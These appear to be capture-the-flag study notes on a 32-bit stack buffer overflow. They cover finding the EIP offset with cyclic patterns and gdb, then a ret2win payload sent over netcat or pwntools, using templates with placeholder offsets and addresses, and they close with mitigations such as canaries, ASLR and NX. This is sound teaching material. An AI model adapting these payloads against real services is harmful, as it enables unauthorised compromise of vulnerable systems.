# Buffer Overflow 

## Typical weaknesses

### Unsafe stack copy 

* A password string is copied into a **fixed-size stack buffer** using `strcpy()`.
* `strcpy()` does not check length, so the long input overwrites:

  1. local variables
  2. saved `EBP`
  3. saved return address (`EIP`)


> NOTE: once `EIP` is overwritten the program returns to an attacker-chosen address

---

### Weak password validation 

* The password check only validates a **prefix/subset** of the real password (like a pattern: first 2 chars are compared, then only the next 4 chars are checked).
* Because validation doesnt cover the full password length, a short string that matches only the checked parts can pass this.

---

## Workflow

### Test overflow and find the offset to EIP


1. Crash with a cyclic pattern.
2. Read the overwritten `EIP` value in `gdb`.
3. Use an offset tool to compute the exact position.

Example:

```bash
#cyclic pattern and run under gdb
python3 - <<'PY'
from pwn import cyclic
print(cyclic(300).decode())
PY
```

and then:

* feed it to the program 
* inspect `EIP` after crash
* compute offset 

like:

```bash
perl -e 'print "A"x<OFFSET> . "BBBB" . "C"x16 . "\n"'
```

Expected debug result:

* `EIP = 0x42424242` (BBBB)
* `EBP = 0x41414141` (AAAA)

---

### Redirect execution to a useful function (ret2win)

Instead of shellcode, we go for **return-to-function**:

* Find the address of the interesting function.
* Overwrite the saved return address with that functions address.

  * Perl: `pack("V", 0xADDRESS)`

payload:

```text
"A" * OFFSET  +  <RET_ADDR>  +  padding  +  "\n"
```

Example (template):

```bash
( perl -e 'print "A"x<OFFSET> . pack("V",0xAAAAAAAA) . "C"x16 . "\n"' ) | nc -w 3 <the_host> <port>
```

> NOTE: The service may crash after printing the secret if execution returns into junk after the function finishes.

---

## Practical commands

### Debugging

```bash
gdb -q ./challenge
(gdb) disassemble check_password
(gdb) info functions
(gdb) p show_password
(gdb) run
(gdb) info registers
(gdb) x/32x $esp
```

### Remote interaction

```bash
echo -ne "<payload>\n" | nc -w 3 <host> <port>
```

### Example pwntools approach

```bash
python3 - <<'PY'
from pwn import *
r = remote("<host>", <port>, timeout=5)
payload = b"A"*<OFFSET> + p32(0xAAAAAAAA) + b"\n"
r.send(payload)
print(r.recvall(timeout=2).decode(errors="ignore"))
PY
```

---

## Things that break the exploit

* **Wrong offset**: off-by-one error if newline handling is inconsistent.
* **Missing newline**: some services read until `\n`.
* **Wrong target address**: if PIE is enabled, function addresses change and if ASLR is on it can become unstable if relying on addresses.
* **Bad characters**: null bytes (`\x00`) can terminate string functions early.

---

## Defensive takeaways

* `strcpy()` into stack buffers is dangerous, so use bounded functions and validate lengths.
* Mitigations that block this style of ret2win:
  * **Stack canaries**
  * **PIE + ASLR**
  * **NX** (mainly blocks shellcode. ret2libc/ret2win still possible if addresses are known)
